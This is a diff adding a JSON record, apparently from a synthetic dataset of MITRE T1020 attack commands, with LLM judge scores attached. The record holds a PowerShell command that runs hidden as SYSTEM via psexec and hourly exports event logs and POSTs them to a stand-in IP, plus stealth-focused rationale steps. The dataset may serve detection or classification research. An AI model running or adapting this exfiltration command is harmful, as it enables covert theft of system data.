@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; while ($true){ $bundle=Join-Path $env:TEMP ('evt-' + (Get-Date -Format yyyyMMddHHmmss) + '.evtx'); wevtutil epl 'Microsoft-Windows-PowerShell/Operational' $bundle > $null 2>&1; curl -s -X POST --data-binary @`\"$bundle`\" https://198.51.100.60/upload > $null 2>&1; if ($LASTEXITCODE -eq 0){ Remove-Item -Force $bundle }; Start-Sleep 3600 }\"",
+  "explanation": "Periodically exports the PowerShell Operational event log and exfiltrates it via HTTP POST using curl in silent mode, cleaning up the bundle after successful transfer.",
+  "rationale_steps": [
+    "Run as SYSTEM and detached to remain hidden using PSExec.",
+    "Export a relevant event log to a temporary file.",
+    "Upload the log via HTTP POST with curl while suppressing output.",
+    "Delete the exported file upon success to avoid re-sending.",
+    "Execute hourly in a loop for automated, ongoing exfiltration."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-b810a449",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and escaping with valid PsExec and PowerShell flags, proper separators, and correct redirections make it parseable as written.",
+        "semantic_score": 3,
+        "semantic_justification": "It automates periodic log export and HTTP POST exfiltration, but will likely fail because PowerShell's curl alias (not curl.exe) breaks the arguments, the target IP is a documentation-only range, and it implicitly requires elevated privilege despite stating none.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T04:51:08.864770Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with proper PowerShell syntax, valid psexec flags, and correct loop/sleep structure, though the backtick escaping of the curl argument (`\"$bundle`\") is slightly unconventional and may cause issues depending on how the outer shell interprets the quoting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1020 automated exfiltration: it uses psexec to run as SYSTEM in a hidden window, loops hourly to export the PowerShell Operational event log via wevtutil, exfiltrates the bundle via HTTP POST to an external IP using curl, and cleans up the artifact on successful transfer — fully consistent with the described technique.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-18T22:28:11.801796Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a syntactically valid PowerShell string with balanced quotes, proper use of the while loop, and correct command separators.",
+        "semantic_score": 3,
+        "semantic_justification": "While the logic perfectly mirrors the T1020 technique, the command will fail in a PowerShell environment because double quotes trigger local variable expansion of $bundle and $env:TEMP before execution, and the 'curl' alias in PowerShell conflicts with the external curl.exe arguments.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:28:31.768239Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.167,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
